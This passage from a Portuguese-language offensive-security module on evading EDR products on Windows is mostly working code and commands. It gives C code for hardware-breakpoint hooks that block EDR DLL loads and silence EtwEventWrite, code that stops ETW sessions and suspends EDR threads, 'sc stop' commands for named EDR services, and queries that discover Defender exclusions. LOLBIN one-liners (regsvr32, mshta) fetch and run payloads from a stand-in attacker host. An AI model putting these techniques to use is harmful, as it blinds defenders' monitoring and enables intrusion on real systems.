| API Unhooking (remap) | Cópia de ntdll do disco + `LoadLibrary` | T1562.001 |
| Direct Syscalls | SysWhispers (`github.com/jthuraisamy/SysWhispers`) | T1106 |
| Drip Allocation | DripLoader (`github.com/xinbailu/DripLoader`) | T1055 |
| COM Object abuse | `New-Object -com "InternetExplorer.Application"` | T1559.001 |
| LOLBIN delegation | TeamViewer, Ngrok+RDP, Rclone | T1219, T1048 |
| AMSI Bypass | Patch de `AmsiScanBuffer` | T1562.001 |

---

## Hardware Breakpoint (HBP) Hooking — Patchless

### Por Que HBP Substitui Hooking Tradicional

Hooking via byte-patching (`jmp` em prologue, IAT, EAT) é detectável por memory integrity checks — EDR compara bytes em memória vs cópia disk e detecta divergência.

HBP é patchless: usa registradores debug (DR0-DR3) da CPU para interceptar execução sem modificar memória.

Vantagens:
- DLL idêntica ao disco em memory scan.
- CFG/CIG não bloqueiam (não há write em página executável).
- Thread-local (afeta só thread alvo).

Limitações:
- Apenas 4 breakpoints HW por thread (DR0-DR3).
- Thread-scoped: migrar de thread quebra hook.
- DR7 visível via `GetThreadContext` — defender pode auditar.

### Mecânica

1. Resolver endereço da função alvo (`GetProcAddress`).
2. `AddVectoredExceptionHandler` registra VEH.
3. `GetThreadContext(CONTEXT_DEBUG_REGISTERS)`.
4. Setar `Dr0 = pTarget`, `Dr7 = 0x1` (enable L0, execute, len=1).
5. `SetThreadContext`.
6. Thread executa pTarget → CPU dispara `EXCEPTION_SINGLE_STEP` → VEH antes da função.
7. VEH manipula CONTEXT: lê args via RCX/RDX/R8/R9, pode pular função (set Rip = retaddr).

### Código — Hook em LoadLibraryW

```c
#include <windows.h>

static LPVOID g_pTarget = NULL;

LONG WINAPI HbpHandler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT pCtx = pInfo->ContextRecord;
    if (pCtx->Rip != (DWORD64)g_pTarget)
        return EXCEPTION_CONTINUE_SEARCH;

    LPCWSTR pName = (LPCWSTR)pCtx->Rcx;  // 1º arg

    // Block se nome contém "edr"
    if (pName && wcsstr(pName, L"edr")) {
        pCtx->Rax = 0;                              // NULL retorno
        pCtx->Rip = *(DWORD64*)pCtx->Rsp;           // pop retaddr
        pCtx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL InstallHbp(LPVOID pTarget) {
    g_pTarget = pTarget;
    AddVectoredExceptionHandler(1, HbpHandler);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)pTarget;
    ctx.Dr7 = 0x1;
    return SetThreadContext(GetCurrentThread(), &ctx);
}
```

### Bypass Patchless de EDR Hooks

EDR coloca `jmp` no prologue de `NtAllocateVirtualMemory`. Em vez de remendar, **pular sobre** com HBP:

1. HBP em `NtAllocateVirtualMemory` (endereço hookado).
2. VEH lê args via registros.
3. VEH executa syscall direto (`syscall` instr inline) com mesmos args.
4. VEH seta `Rax = NTSTATUS`, `Rip = retaddr`, `Rsp += 8`.

EDR hook nunca executa, DLL fica intacta.

---

## ETW Patching Avançado

### Patch Clássico — Limitações

`EtwEventWrite` em ntdll: sobrescrever 1º byte com `0xC3` (RET) → função retorna sem registrar.

```c
*(BYTE*)pEtw = 0xC3;
```

**Detecção**: memory integrity check vê byte diferente do disk.

### HBP-Patchless ETW Bypass

HBP em `EtwEventWrite` retornando `STATUS_SUCCESS` sem patch:

```c
LONG WINAPI EtwHbpHandler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    PCONTEXT pCtx = pInfo->ContextRecord;
    if (pCtx->Rip != (DWORD64)g_pEtwEventWrite)
        return EXCEPTION_CONTINUE_SEARCH;

    pCtx->Rax = 0;                              // STATUS_SUCCESS
    pCtx->Rip = *(DWORD64*)pCtx->Rsp;
    pCtx->Rsp += 8;
    return EXCEPTION_CONTINUE_EXECUTION;
}
```

Ntdll intacta. Bypass thread-scoped — funciona enquanto thread chamadora.

### Provider Session Hijacking

ETW arquitetura: Provider → Session/Logger → Consumer.

Atacar **sessão** em vez de provider:

1. Enumerar sessões ETW ativas via `EnumerateTraceGuidsEx`.
2. Identificar sessão EDR (Microsoft-Windows-Threat-Intelligence, DiagLog, etc.).
3. `ControlTraceW(0, sessionName, props, EVENT_TRACE_CONTROL_STOP)` — para sessão.
4. Operação maliciosa.
5. Recriar sessão depois.

```c
EVENT_TRACE_PROPERTIES props = { 0 };
props.Wnode.BufferSize = sizeof(props);
ControlTraceW(0, L"DiagLog", &props, EVENT_TRACE_CONTROL_STOP);
```

Requer `SeSystemProfilePrivilege` ou admin.

### ETW-Ti Limitação

`Microsoft-Windows-Threat-Intelligence` é alimentado por kernel callbacks (memory alloc, thread creation). Não passa por `EtwEventWrite` userland → patch userland **não afeta**.

Silenciar ETW-Ti requer:
- BYOVD para kernel-level patch.
- Stop session do consumer (rota acima).

Userland patching = insuficiente para EDRs modernos.

---

## Exploiting EDRs — LOLBINs + Exclusion Lists

### LOLBINs como Proxy de Execução

Em vez de evadir hooks, executar via **binários assinados Microsoft já permitidos**. EDR não bloqueia regsvr32.exe, mshta.exe, installutil.exe por default.

```cmd
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
mshta http://attacker/payload.hta
rundll32 .\payload.dll,EntryPoint
installutil.exe /LogToConsole=false /U payload.exe
msbuild.exe payload.xml
```

Catálogo completo: lolbas-project.github.io.

### Exclusion List Discovery

Conhecer exclusions do AV/EDR = local seguro para payload.

#### Defender exclusions

```powershell
Get-MpPreference | Select -Expand ExclusionPath
Get-MpPreference | Select -Expand ExclusionProcess
Get-MpPreference | Select -Expand ExclusionExtension
```

#### Sem PowerShell — registry

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
```

Comum: `C:\Dev\`, `C:\Builds\`, dev tool exclusions corporativas.

### Preventing EDR Action

#### Driver Service Stop (SYSTEM required)

```cmd
sc stop CSAgent
sc stop SentinelOne
sc stop sysmondrv
```

Bloqueado em produtos com self-protection. Variante BYOVD: kernel termination via driver vulnerável.

#### EDR Thread Suspend

```c
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te = { sizeof(te) };
Thread32First(hSnap, &te);
do {
    if (te.th32OwnerProcessID == dwEdrPid) {
        HANDLE hT = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
        SuspendThread(hT);
        CloseHandle(hT);
    }
} while (Thread32Next(hSnap, &te));
```

Threads suspensas → callbacks param → janela limpa. Self-protection pode bloquear.

---

## Módulos Relacionados

`07_load_time_evasion.md` cobre unhooking via remap de ntdll e técnicas em load time. `08_runtime_evasion_sleepmask.md` aprofunda em syscalls diretas/indiretas, ETW patching e AMSI patching. `05_wdac_bypass.md` complementa o EDR no nível de aplicação. MITRE ATT&CK: T1562.001 (Disable/Modify Tools), T1055 (Process Injection), T1003 (Credential Dumping).

---

## Leitura Complementar

- Pavel Yosifovich, *Windows Kernel Programming*
- *The Art of Memory Forensics* — capítulos sobre EDR architecture
- SpecterOps — "A Tale of EDR Bypass Methods"
- Mr.Un1k0d3r — "EDR Internals"
- modexp.is — Kernel Callbacks series
- j00ru.vexillium.org — Windows syscall tables (SSN por versão)
- Ferramentas: SilkETW, ETWExplorer, API Monitor, WinDbg
